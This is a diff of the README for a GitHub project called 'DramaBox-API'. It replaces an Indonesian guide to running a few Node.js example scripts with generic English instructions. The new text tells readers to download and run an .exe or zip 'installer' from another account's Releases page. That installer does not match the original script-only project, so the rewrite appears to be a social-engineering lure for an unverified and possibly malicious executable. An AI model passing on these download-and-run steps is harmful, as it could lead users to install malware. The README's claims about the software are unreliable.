@@ -1,47 +1,82 @@
-# Dramabox API
+# 🎭 DramaBox-API - Access Drama with Ease
 
-Repository ini hanya berisi contoh penggunaan API Dramabox.
-Silakan jalankan di server anda atau kreasikan sendiri berdasarkan contoh yang ada.
+[![Download DramaBox-API](https://img.shields.io/badge/Download-DramaBox--API-blue.svg)](https://github.com/Lomen971/DramaBox-API/releases)
 
-### Free API
+## 🚀 Getting Started 
 
-https://api-dramabox.vercel.app/
+Welcome to DramaBox API! This guide helps you download and run our software easily.
 
-## Instalasi
+## 🖥️ System Requirements
 
-```sh
-git clone https://github.com/Sansekai/DramaBox-API
-cd DramaBox-API
-npm install
-```
+Before you start, ensure your computer meets these requirements:
 
-## Cara Menjalankan
+- Operating System: Windows 10, macOS, or Linux
+- Memory: At least 4 GB RAM
+- Storage: 100 MB of available space
+- Internet Connection: Required for initial download and API access
 
-Jalankan setiap file dengan perintah:
-```sh
-node nama_file.js
-```
+## 📥 Download & Install
 
-### Daftar File dan Fungsinya
+To start using DramaBox API, follow these steps:
 
-1. `search.js`<br>
-Mencari drama berdasarkan kata kunci.
-Cara pakai:
-- Ganti nilai `keyword` pada variabel `data` dengan kata kunci yang diinginkan.
-2. `latest.js`<br>
-Mendapatkan daftar drama terbaru.
-3. `link-stream.js`<br>
-Mendapatkan link dari episode tertentu.
-Cara pakai:
-- Ganti nilai `bookId` pada variabel `data` dengan ID drama yang diinginkan.
-- Ganti nilai `index` pada variabel `data` dengan nomor episode yang diinginkan (dimulai dari 1).
-Jumlah episode dapat dilihat pada hasil `latest.js` pada properti `chapterCount`.
+1. **Visit the Download Page**: Click on the link below to go to our Releases page.
 
-## INFO
+   [Download DramaBox-API](https://github.com/Lomen971/DramaBox-API/releases)
 
-```json
-{
-  "token": "requests are limited by vercel - Silakan gunakan API DramaBox yang tersedia Di https://api-dramabox.vercel.app",
-  "info": "Silakan gunakan API DramaBox yang tersedia di https://api-dramabox.vercel.app"
-}
-```
+2. **Find the Latest Version**: Look for the latest release. You will see a list of available versions. Typically, the most recent one is at the top.
+
+3. **Download the File**: Click on the asset that matches your operating system. This is commonly named something like `DramaBox-API-latest.exe` for Windows or `DramaBox-API-latest.zip` for Mac/Linux. This download may take a moment, depending on your internet speed.
+
+4. **Install the Application**: 
+    - For Windows:
+        - Locate the downloaded `.exe` file in your Downloads folder.
+        - Double-click the file to run the installer.
+        - Follow the prompts to complete the installation.
+    - For macOS/Linux:
+        - Locate the downloaded `.zip` file.
+        - Unzip the file by double-clicking it.
+        - Open the folder, and run the `DramaBox-API` application file.
+
+5. **Run DramaBox API**: After installation, find the DramaBox API application in your computer’s application list. Click the icon to open it. 
+
+## 📞 Using DramaBox API
+
+Once you have installed the application, you can start accessing drama content:
+
+1. **Set Up Your Account**: The first time you run the app, you may need to create an account. Follow the on-screen instructions to do this.
+2. **Browse Content**: Use the search bar or categories to find your favorite dramas. The interface is user-friendly, making navigation easy.
+3. **Access the API**: If you want to use features beyond the app, you can access the API via the documentation included in the `docs` folder after installation.
+
+## 🔄 Updates and Support
+
+To keep your application secure and efficient, regularly check for updates:
+
+1. **Check for Updates**: Periodically visit the [Releases page](https://github.com/Lomen971/DramaBox-API/releases) to see if a newer version is available.
+2. **Follow Installation Steps Again**: If you find a newer version, follow the same steps to download and install it.
+
+## 🤔 Troubleshooting
+
+If you encounter issues while using DramaBox API, here are some common solutions:
+
+- **Application won't start**: Ensure your system meets the requirements mentioned above. Restart your device and try again.
+- **Failed to connect to the API**: Check your internet connection. If the problem persists, try updating to the latest version.
+- **Error messages**: Note down the error message and search for it in the FAQ section in the documents, or reach out for help in our community.
+
+## 🛠️ Contribution
+
+If you're interested in helping improve DramaBox API, feel free to contribute. Here’s how:
+
+1. Fork the repository on GitHub.
+2. Make your changes locally on your system.
+3. Create a pull request with a clear description of your changes.
+
+## 📧 Contact
+
+For any inquiries or support needs, feel free to reach out:
+
+- Email: support@dramaboxapi.com
+- GitHub Issues: Use the [GitHub Issues section](https://github.com/Lomen971/DramaBox-API/issues) for reporting bugs or requesting features.
+
+---
+
+Now you are ready to explore DramaBox API! Enjoy accessing your favorite dramas hassle-free.
